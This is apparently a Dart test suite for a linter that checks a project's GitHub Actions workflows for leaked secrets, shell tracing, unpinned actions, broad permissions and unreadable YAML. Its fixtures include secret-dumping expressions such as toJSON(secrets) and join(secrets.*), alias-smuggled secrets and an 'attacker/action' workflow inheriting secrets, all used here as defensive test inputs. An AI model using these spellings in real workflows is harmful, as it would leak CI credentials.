      // workflow-level `shell: bash` that every file here already has traced
      // every step in the job holding all five secrets (#168).
      const header =
          'name: F\non: workflow_dispatch\n'
          'permissions:\n  contents: read\nconcurrency: f\n';
      const job = 'jobs:\n  a:\n    steps:\n      - run: echo hi\n';

      for (final entry in const {
        'workflow level':
            '${header}defaults:\n  run:\n    shell: bash -x\n$job',
        'job level':
            '${header}jobs:\n  a:\n    defaults:\n      run:\n'
            '        shell: bash -x\n    steps:\n      - run: echo hi\n',
        'step level':
            '$header${'jobs:\n  a:\n    steps:\n'
                '      - shell: bash -x\n        run: echo hi\n'}',
      }.entries) {
        expect(
          shellTraceOffenders('bad.yml', entry.value),
          isNotEmpty,
          reason: 'trace: a tracing shell at ${entry.key} was accepted',
        );
      }

      for (final entry in const {
        'workflow level': '${header}defaults:\n  run:\n    shell: bash\n$job',
        'job level':
            '${header}jobs:\n  a:\n    defaults:\n      run:\n'
            '        shell: bash\n    steps:\n      - run: echo hi\n',
      }.entries) {
        expect(
          shellTraceOffenders('good.yml', entry.value),
          isEmpty,
          reason: 'trace-negative: a plain shell at ${entry.key} was refused',
        );
      }
    });

    test('a shell: value or SHELLOPTS that traces is refused', () {
      // Read structurally now, so a quoted or flow-style value is seen too.
      for (final bad in const [
        '      - shell: bash -x\n        run: echo hi\n',
        '      - shell: "bash -ex"\n        run: echo hi\n',
        '      - shell: bash -v\n        run: echo hi\n',
        "      - {shell: 'bash -x', run: echo hi}\n",
        '      - run: |\n          export SHELLOPTS=xtrace\n',
      ]) {
        expect(
          shellTraceOffenders('bad.yml', _workflow(bad)),
          isNotEmpty,
          reason: 'trace: accepted `$bad`',
        );
      }
      for (final good in const [
        '      - shell: bash\n        run: echo hi\n',
        '      - shell: pwsh\n        run: echo hi\n',
        '      - shell: bash -e\n        run: echo hi\n',
      ]) {
        expect(
          shellTraceOffenders('good.yml', _workflow(good)),
          isEmpty,
          reason: 'trace-negative: refused `$good`',
        );
      }
    });

    test('a secret is seen through every YAML step shape', () {
      // All five parse to a step whose `run` holds the secret, and all five
      // were invisible to the line scan this replaced (#156).
      const shapes = <String, String>{
        'flow mapping': '      - {run: "echo \${{ secrets.A }}"}\n',
        'quoted key': '      - "run": echo \${{ secrets.B }}\n',
        'anchor before the block indicator':
            '      - run: &s |\n          echo \${{ secrets.C }}\n',
        'alias smuggling':
            '      - name: &a "echo \${{ secrets.D }}"\n'
            '        run: *a\n',
        'multi-line quoted scalar':
            '      - run: "echo\n          \${{ secrets.E }}"\n',
      };
      shapes.forEach((why, step) {
        expect(
          secretsInRunOffenders('bad.yml', _workflow(step)),
          isNotEmpty,
          reason: 'shape: $why was invisible',
        );
      });
    });

    test('a secret is seen through every expression spelling', () {
      // Actions contexts and functions are case-insensitive, and `join` over
      // the `*` filter dumps every secret the job can see (#157).
      for (final expression in const [
        r'${{ secrets.HS_KEY_PASS }}',
        r'${{secrets.HS_KEY_PASS}}',
        r'${{ SECRETS.HS_KEY_PASS }}',
        r'${{ Secrets.HS_KEY_PASS }}',
        r"${{ secrets['HS_KEY_PASS'] }}",
        r'${{ secrets["HS_KEY_PASS"] }}',
        r'${{ toJSON(secrets) }}',
        r'${{ toJson(secrets) }}',
        r'${{ toJSON (secrets) }}',
        r"${{ join(secrets.*, ',') }}",
        r"${{ format('{0}', secrets.HS_KEY_PASS) }}",
        r'${{ fromJSON(toJSON(secrets)).HS_KEY_PASS }}',
      ]) {
        expect(
          secretsInRunOffenders(
            'bad.yml',
            _workflow(_runStep('echo "$expression"')),
          ),
          isNotEmpty,
          reason: 'spelling: accepted `$expression`',
        );
      }
    });

    test('an untrusted value is seen through every expression spelling', () {
      for (final expression in const [
        r'${{ github.ref_name }}',
        r'${{ GITHUB.ref_name }}',
        r"${{ github['ref_name'] }}",
        r'${{ github["ref_name"] }}',
        r"${{ inputs['to_track'] }}",
        r"${{ env['TAG'] }}",
        r'${{ toJSON(github) }}',
        r'${{ fromJSON(github.event.inputs.x) }}',
        r"${{ format('{0}', github.ref_name) }}",
        r'${{ (github.ref_name) }}',
        r'${{ needs.a.outputs.y }}',
        r'${{ matrix.tag }}',
      ]) {
        expect(
          untrustedInRunOffenders(
            'bad.yml',
            _workflow(_runStep('echo "$expression"')),
          ),
          isNotEmpty,
          reason: 'spelling: accepted `$expression`',
        );
      }
    });

    test('prose that merely mentions a secret is allowed', () {
      // The rule used to match the literal text `secrets.`, so a filename or a
      // warning in a message was refused (#157).
      for (final script in const [
        'ls docs/secrets.md',
        'echo "never log secrets.MY"',
        'echo hi # never echo secrets.FOO',
        r'echo "$HS_KEY_PASS"',
        r'cat <<EOF > key.properties'
            '\n'
            r'storePassword=$HS_KEYSTORE_PASS'
            '\nEOF',
      ]) {
        expect(
          secretsInRunOffenders('good.yml', _workflow(_runStep(script))),
          isEmpty,
          reason: 'prose: refused `$script`',
        );
      }
    });

    test(
      'a step that puts run: on the dash line does not swallow its siblings',
      () {
        // `keyIndent` came from the column of the `-`, so `env:` after a
        // dash-line `run:` was read as part of the script and flagged — the
        // exact remediation the rule prescribes (#156).
        const step =
            '      - run: |\n'
            '          echo "\$K"\n'
            '        env:\n'
            '          K: \${{ secrets.HS_KEY_PASS }}\n';
        expect(
          secretsInRunOffenders('good.yml', _workflow(step)),
          isEmpty,
          reason: 'dash-line: refused a secret passed through step env:',
        );
      },
    );

    test('a document that parses but is not a usable workflow is refused', () {
      // parse() set `problem` only when the YAML would not load. Each of
      // these loaded, produced zero jobs or steps, and yielded zero
      // offenders from every rule — so a structurally wrong workflow scanned
      // as clean. The header promises the opposite: a guard that cannot read
      // its subject must fail, not pass quietly (#177).
      const unusable = <String, String>{
        'jobs: as a list': 'name: X\non: push\njobs:\n  - gate\n',
        'jobs: with no jobs': 'name: X\non: push\njobs: {}\n',
        'steps: as a map':
            'name: X\non: push\njobs:\n  a:\n    steps:\n      run: echo hi\n',
        'a step with neither run nor uses':
            'name: X\non: push\njobs:\n  a:\n    steps:\n      - name: x\n',
        'run: as a number':
            'name: X\non: push\njobs:\n  a:\n    steps:\n      - run: 42\n',
        'run: as a list':
            'name: X\non: push\njobs:\n  a:\n    steps:\n'
            '      - run:\n          - echo hi\n',
        'valid YAML that is not a workflow': 'hello: world\n',
      };
      unusable.forEach((why, text) {
        final wf = Workflow.parse('x.yml', text);
        expect(
          wf.problem,
          isNotNull,
          reason: 'unusable: "$why" was accepted as a readable workflow',
        );
        // And every rule must report it, rather than returning empty.
        for (final rule in <List<WorkflowOffender> Function(String, String)>[
          unpinnedUses,
          permissionOffenders,
          concurrencyOffenders,
        ]) {
          expect(
            rule('x.yml', text),
            isNotEmpty,
            reason: 'unusable: "$why" scanned clean',
          );
        }
      });
    });

    test('an Error escaping the loader is an offender, not a crash', () {
      // The handler exists because StackOverflowError is an Error, not an
      // Exception, so `on YamlException` misses it and it escapes parse().
      //
      // The test that guarded it asserted nothing. It nested 6000 deep, and
      // I had measured that depth with `dart run` — `flutter test` has a
      // different stack size, so under the real runner 6000 raises a
      // YamlException and the test passed through the wrong branch.
      // Deleting the handler left the suite green (#191).
      //
      // Raising the depth is not the fix: it was lowered from 60000 because
      // that much stack pressure failed an unrelated file running
      // concurrently. So the handler is exercised directly instead, by
      // throwing the Error from inside the load.
      expect(
        () => Workflow.parse(
          'x.yml',
          'a: b\n',
          load: (_) => throw StackOverflowError(),
        ),
        returnsNormally,
        reason:
            'parse-error: a StackOverflowError from the loader escaped as a '
            'crash. It is an Error, not an Exception, so `on YamlException` '
            'does not catch it',
      );
      // The SAME method the guards call, with its loader replaced — not a
      // sibling that `parse` might or might not delegate to (#194).
      final wf = Workflow.parse(
        'x.yml',
        'a: b\n',
        load: (_) => throw StackOverflowError(),
      );
      expect(
        wf.problem,
        contains('too deep'),
        reason: 'parse-error: the offender must name what went wrong',
      );

      // And the real thing still behaves, at whatever depth this runner
      // overflows or refuses — either outcome is an offender, which is the
      // property that matters.
      expect(
        Workflow.parse('x.yml', 'a:\n    ${'[' * 6000}').problem,
        isNotNull,
      );
    });

    test('a workflow that cannot be parsed is refused, not skipped', () {
      const broken = 'name: Broken\non: [push\njobs:\n  a:\n';
      for (final offenders in [
        secretsInRunOffenders('broken.yml', broken),
        untrustedInRunOffenders('broken.yml', broken),
        shellTraceOffenders('broken.yml', broken),
      ]) {
        expect(
          offenders,
          isNotEmpty,
          reason: 'unparseable: a guard that cannot read its subject must fail',
        );
      }
    });

    test('tracing is seen through quotes, paths and + flag groups', () {
      for (final script in const [
        'set -x',
        'set -euo pipefail; set -x',
        'set -e -x',
        'set -v',
        'set -o xtrace',
        'set -o errexit -o xtrace',
        'set +e -x',
        'set +u -o xtrace',
        '"set -x; ./b.sh"',
        "'set -x'",
        '/bin/bash -x tools/gate.sh',
        '/usr/bin/bash -x x.sh',
        'bash --verbose x.sh',
        'bash -o xtrace x.sh',
        'exec bash -x x.sh',
      ]) {
        expect(
          shellTraceOffenders('bad.yml', _workflow(_runStep(script))),
          isNotEmpty,
          reason: 'trace: accepted `$script`',
        );
      }
      for (final script in const [
        'set -euo pipefail',
        'set -o pipefail',
        'settle -x',
        'set -- -x',
        'grep -v foo bar',
        'curl -sv https://example.invalid',
        'bash tools/gate.sh',
      ]) {
        expect(
          shellTraceOffenders('good.yml', _workflow(_runStep(script))),
          isEmpty,
          reason: 'trace-negative: refused `$script`',
        );
      }
    });

    test('a dependabot file missing an ecosystem is refused', () {
      const onlyActions =
          'version: 2\nupdates:\n  - package-ecosystem: github-actions\n';
      expect(dependabotOffenders(onlyActions).join(), contains('pub'));
      expect(dependabotOffenders(null).join(), contains('missing'));
    });

    test('a pin below the pubspec minimum is refused', () {
      expect(
        flutterPinOffenders(
          '{"flutter": "3.46.0"}',
          'environment:\n  sdk: ^3.13.4\n  flutter: ">=3.47.0"\n',
        ).join(),
        contains('below the minimum'),
      );
      expect(
        flutterPinOffenders(
          '{"flutter": "3.47.5"}',
          'environment:\n  sdk: ^3.13.4\n  flutter: ">=3.47.0"\n',
        ),
        isEmpty,
      );
      expect(
        flutterPinOffenders(
          '{"flutter": "3.47.5"}',
          'environment:\n  sdk: ^3.13.4\n',
        ).join(),
        contains('no `flutter:'),
      );
    });
    test('a uses: with no ref is refused', () {
      final offenders = unpinnedUses(
        'bad.yml',
        _workflow('      - uses: actions/checkout\n'),
      );
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('no @ref'));
    });
    test('a trailing @ with nothing after it is refused', () {
      expect(
        unpinnedUses('bad.yml', _workflow('      - uses: actions/checkout@\n')),
        hasLength(1),
      );
    });
    for (final ref in floatingRefs) {
      test('a ref of `$ref` is refused', () {
        final offenders = unpinnedUses(
          'bad.yml',
          _workflow('      - uses: actions/checkout@$ref\n'),
        );
        expect(offenders, hasLength(1));
        expect(offenders.single.message, contains('moving ref'));
      });
    }

    test('a ref that merely contains a floating word is allowed', () {
      // `v2-main-branch` is a real tag shape; only the whole ref counts.
      expect(
        unpinnedUses(
          'good.yml',
          _workflow('      - uses: a/b@v2-main-branch\n'),
        ),
        isEmpty,
      );
      expect(
        unpinnedUses(
          'good.yml',
          _workflow('      - uses: a/b@latest-stable\n'),
        ),
        isEmpty,
      );
    });

    test('an unpinned action written as a flow mapping is refused', () {
      // The line scan matched `^\s*-?\s*uses:`, so `- {uses: x}` returned
      // zero offenders — the exact bypass class #154 was filed for, still
      // open in this rule because it was never converted (#175).
      final offenders = unpinnedUses(
        'bad.yml',
        _workflow('      - {uses: attacker/action}\n'),
      );
      expect(
        offenders,
        hasLength(1),
        reason: 'flow-style `uses:` must be seen',
      );
      expect(offenders.single.message, contains('no @ref'));
    });

    test('an unpinned action whose value is on the next line is refused', () {
      final offenders = unpinnedUses(
        'bad.yml',
        _workflow('      - uses:\n          attacker/action\n'),
      );
      expect(offenders, hasLength(1));
    });

    test("a job's own uses: is subject to the pin rule", () {
      // WorkflowJob.uses was parsed and never consulted by this rule.
      final offenders = unpinnedUses(
        'bad.yml',
        'name: X\n'
            'on: workflow_dispatch\n'
            'permissions:\n  contents: read\n'
            'concurrency: x\n'
            'jobs:\n'
            '  a:\n'
            '    uses: attacker/wf/.github/workflows/x.yml\n'
            '    secrets: inherit\n',
      );
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('job `a`'));
    });

    test('a folded or anchored uses: is not a false positive', () {
      // Both were flagged as missing a ref by the line scan, erring safe but
      // wrongly — the parser resolves them to their value (#175). The
      // anchored half was fixed and untested, in a test whose name claims
      // it (#196).
      expect(
        unpinnedUses(
          'good.yml',
          _workflow('      - uses: >-\n          actions/checkout@v7\n'),
        ),
        isEmpty,
        reason: 'folded',
      );
      expect(
        unpinnedUses(
          'good.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency: x\n'
              'x: &pin actions/checkout@v7\n'
              'jobs:\n  a:\n    steps:\n      - uses: *pin\n',
        ),
        isEmpty,
        reason: 'anchored: an alias resolves to its pinned value',
      );
      // And the complement, so the anchor case cannot pass by being unread.
      expect(
        unpinnedUses(
          'bad.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency: x\n'
              'x: &bad attacker/action\n'
              'jobs:\n  a:\n    steps:\n      - uses: *bad\n',
        ),
        isNotEmpty,
        reason: 'anchored: an alias to an unpinned action must be refused',
      );
    });

    test('a pinned ref, a local action and a container are all allowed', () {
      const good =
          '      - uses: actions/checkout@v7\n'
          '      - uses: "subosito/flutter-action@v2"\n'
          "      - uses: 'ludeeus/action-shellcheck@2.0.0'\n"
          '      - uses: ./.github/workflows/ci.yml\n'
          '      - uses: docker://alpine:3.20\n'
          '      - uses: actions/checkout@v7  # trailing comment\n'
          '      # - uses: actions/checkout\n';
      expect(
        unpinnedUses('good.yml', _workflow(good)),
        isEmpty,
        reason: 'pins-negative: refused a legitimate uses: line',
      );
    });
    test('a workflow without top-level permissions is refused', () {
      const bad =
          'name: X\non: push\nconcurrency: x\n'
          'jobs:\n  a:\n    permissions:\n      contents: read\n'
          '    steps:\n      - run: \'true\'\n';
      final offenders = permissionOffenders('bad.yml', bad);
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('no top-level'));
    });
    test('write-all is refused at any level', () {
      const bad =
          'name: X\non: push\nconcurrency: x\n'
          'permissions: read-all\n'
          'jobs:\n  a:\n    permissions: write-all\n'
          '    steps:\n      - run: \'true\'\n';
      final offenders = permissionOffenders('bad.yml', bad);
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('write-all'));
    });
    test('write-all is refused when quoted', () {
      // `permissions: 'write-all'` returned zero offenders: the line scan
      // matched the bare word only, and GitHub honours both (#175).
      const bad =
          'name: X\non: push\nconcurrency: x\n'
          "permissions: 'write-all'\n"
          'jobs:\n  a:\n    steps:\n      - run: \'true\'\n';
      final offenders = permissionOffenders('bad.yml', bad);
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('write-all'));
    });
    test('read-all at the top level is allowed', () {
      expect(
        permissionOffenders(
          'good.yml',
          'name: X\non: push\nconcurrency: x\npermissions: read-all\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        isEmpty,
      );
    });
    test('a workflow without concurrency is refused', () {
      expect(
        concurrencyOffenders(
          'bad.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        hasLength(1),
      );
    });
    test('concurrency in either form is allowed', () {
      expect(
        concurrencyOffenders(
          'good.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency: play-release\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        isEmpty,
      );
      expect(
        concurrencyOffenders(
          'good.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency:\n  group: ci\n  cancel-in-progress: true\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        isEmpty,
      );
    });
    test('no composite action exists that the rules cannot read', () {
      // The rules parse `jobs:` — a composite action's steps live under
      // `runs.steps`, so `.github/actions/**/action.yml` is scanned by
      // nothing: not for pins, not for secrets in run:, not for tracing.
      // None exist today, so this is a tripwire rather than a scan: adding
      // one fails here, and whoever adds it extends the rules first (#180).
      final dir = Directory('${repoRoot.path}/.github/actions');
      final found = dir.existsSync()
          ? dir
                .listSync(recursive: true)
                .whereType<File>()
                .where((f) => RegExp(r'action\.ya?ml$').hasMatch(f.path))
                .map((f) => f.path.replaceFirst('${repoRoot.path}/', ''))
                .toList()
          : <String>[];
      expect(
        found,
        isEmpty,
        reason:
            'composite actions are not covered by unpinnedUses, '
            'secretsInRunOffenders or shellTraceOffenders, which read '
            '`jobs:` and not `runs.steps`. Extend them before adding $found',
      );
    });

    test('only release.yml may upload to Play', () {
      // The rule applied to every workflow, not only the one it was written
      // for. ci.yml is `workflow_call`ed by release.yml with
      // `secrets: inherit`, so an upload step added there runs with
      // PLAY_SERVICE_ACCOUNT_JSON on a tag push (#182).
      for (final path in _workflowFiles()) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        if (path.endsWith('release.yml')) {
          expect(_playUploads(wf), [
            'ship.play',
          ], reason: 'upload-scope: release.yml must upload once, from ship');
        } else {
          _expectNoPlayUpload(wf);
        }
        _assertRunnerAndEnvironment(wf);
      }
    });

    test('an offender names its line in every scalar style', () {
      // #188 fixed the block style and broke the single-line one, because
      // `bodyLine = line + 1` was unconditional and the issue's premise
      // ("every block-scalar run: … and that is all of them") was false.
      // Nine single-line `run:` values live in these workflows. All four
      // styles are asserted now, so neither direction can drift (#188, #195).
      const head =
          'name: X\n' // 1
          'on: push\n' // 2
          'permissions:\n' // 3
          '  contents: read\n' // 4
          'concurrency: x\n' // 5
          'jobs:\n' // 6
          '  a:\n' // 7
          '    steps:\n'; // 8
      final cases = <String, ({String yaml, int line})>{
        'block scalar': (
          yaml: '$head      - run: |\n          echo one\n          set -x\n',
          line: 11,
        ),
        'folded scalar': (
          yaml: '$head      - run: >-\n          set -x\n',
          line: 10,
        ),
        'plain single line': (yaml: '$head      - run: set -x\n', line: 9),
        'quoted single line': (yaml: '$head      - run: "set -x"\n', line: 9),
      };
      cases.forEach((style, c) {
        final offenders = shellTraceOffenders('x.yml', c.yaml);
        expect(offenders, hasLength(1), reason: 'offender-line: $style');
        expect(
          offenders.single.line,
          c.line,
          reason:
              'offender-line: $style — the offence is on line ${c.line} and '
              'the offender says ${offenders.single.line}',
        );
      });
    });

    test('a job that is not a mapping is refused, not skipped', () {
      // `if (jobMap is! YamlMap) continue;` dropped it silently with
      // problem == null, so all three rules returned zero offenders for a
      // file holding one — #177's class in one more spelling (#188).
      const doc =
          'name: X\non: push\npermissions:\n  contents: read\n'
          'concurrency: x\n'
          'jobs:\n'
          '  a: nope\n'
          '  b:\n    steps:\n      - run: echo hi\n';
      final wf = Workflow.parse('x.yml', doc);
      expect(wf.problem, isNotNull, reason: 'a scalar job scanned as clean');
      expect(wf.problem, contains('not mappings'));
      for (final rule in <List<WorkflowOffender> Function(String, String)>[
        unpinnedUses,
        permissionOffenders,
        concurrencyOffenders,
      ]) {
        expect(rule('x.yml', doc), isNotEmpty);
      }
    });

    test('write-all is refused whatever its case', () {
      // Compared case-sensitively where the rest of this file is
      // deliberately case-insensitive (#188).
      for (final spelling in const [
        'write-all',
        'WRITE-ALL',
        'Write-All',
        "'write-all'",
      ]) {
        final doc =
            'name: X\non: push\nconcurrency: x\n'
            'permissions: $spelling\n'
            "jobs:\n  a:\n    steps:\n      - run: 'true'\n";
        expect(
          permissionOffenders('x.yml', doc),
          isNotEmpty,
          reason: 'write-all-case: `$spelling` was accepted',
        );
      }
    });

    test(
      'the required checks are still bound, and are the check-run names',
      () {
        // The one part of the merge gate with no guard on it: the ruleset lives
        // in GitHub config, so #187 is real today and silently reversible
        // tomorrow — the same failure mode as the issue itself, a gate that
        // exists but does not bind (#196).
        //
        // Skipped rather than failed without network or auth: this asserts a
        // fact about the remote, and a developer offline should not see a red
        // suite for it. CI has both.
        final probe = Process.runSync(
          'gh',
          [
            'api',
            'repos/honestarcade/HonestSudoku/rulesets/23682733',
            '--jq',
            '[.enforcement] + [.rules[] | select(.type=="required_status_checks") '
                '| .parameters.required_status_checks[] '
                '| .context + ":" + (.integration_id|tostring)] | join(" ")',
          ],
          stdoutEncoding: utf8,
          stderrEncoding: utf8,
        );
        if (probe.exitCode != 0) {
          markTestSkipped('gh unavailable or unauthenticated');
          return;
        }
        final got = probe.stdout.toString().trim();
        expect(
          got,
          contains('active'),
          reason: 'ruleset: the main branch ruleset is not active',
        );
        for (final check in const ['gate', 'mutations']) {
          expect(
            got,
            contains('$check:15368'),
            reason:
                'ruleset: `$check` is not a required status check pinned to '
                'GitHub Actions. The context is the CHECK-RUN NAME, not the '
                "PR UI's rendering (`CI / $check`) — #137 learned that twice",
          );
        }
      },
    );

    test('dependabot watches both ecosystems', () {
      final offenders = dependabotOffenders(
        pathExists('.github/dependabot.yml')
            ? readFile('.github/dependabot.yml')
            : null,
      );
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('dependabot', offenders),
      );
    });
    test('the .fvmrc pin satisfies the pubspec range', () {
      final offenders = flutterPinOffenders(
        readFile('.fvmrc'),
        readFile('pubspec.yaml'),
      );
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('flutter-pin', offenders),
      );
    });
  });
}
